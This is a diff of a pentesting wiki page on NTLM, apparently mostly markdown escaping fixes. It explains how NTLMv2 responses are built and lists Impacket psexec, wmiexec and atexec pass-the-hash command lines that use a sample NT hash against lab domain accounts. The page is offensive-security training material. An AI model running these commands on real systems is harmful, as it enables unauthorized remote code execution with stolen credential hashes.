@@ -84,7 +84,7 @@ Remember that the printer will use the computer account during the authenticatio
 
 The **challenge length is 8 bytes** and **2 responses are sent**: One is **24 bytes** long and the length of the **other **is **variable**.
 
-**The first response** is created by ciphering using **HMAC_MD5 **the **string **composed by the **client and the domain** and using as **key **the **hash MD4 **of the** NT hash**. Then, the **result **will by used as **key **to cipher using **HMAC_MD5 **the **challenge**. To this, **a client challenge of 8 bytes will be added**. Total: 24 B.
+**The first response** is created by ciphering using **HMAC\_MD5 **the **string **composed by the **client and the domain** and using as **key **the **hash MD4 **of the** NT hash**. Then, the **result **will by used as **key **to cipher using **HMAC\_MD5 **the **challenge**. To this, **a client challenge of 8 bytes will be added**. Total: 24 B.
 
 The **second response** is created using** several values** (a new client challenge, a **timestamp **to avoid **replay attacks**...)
 
@@ -110,13 +110,13 @@ This will launch a process that will belongs to the users that have launch mimik
 ### Pass-the-Hash from linux
 
 You can obtain code execution in Windows machines using Pass-the-Hash from Linux. \
-[**Access here to learn how to do it.**](../../pentesting/pentesting-smb.md#execute)****
+[**Access here to learn how to do it.**](broken-reference)****
 
 ### Impacket Windows compiled tools
 
-You can download[ impacket binaries for Windows here](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).
+You can download[ impacket binaries for Windows here](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).
 
-* **psexec_windows.exe **`C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
+* **psexec\_windows.exe **`C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
 * **wmiexec.exe **`wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
 * **atexec.exe** (In this case you need to specify a command, cmd.exe and powershell.exe are not valid to obtain an interactive shell)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
 * There are several more Impacket binaries...
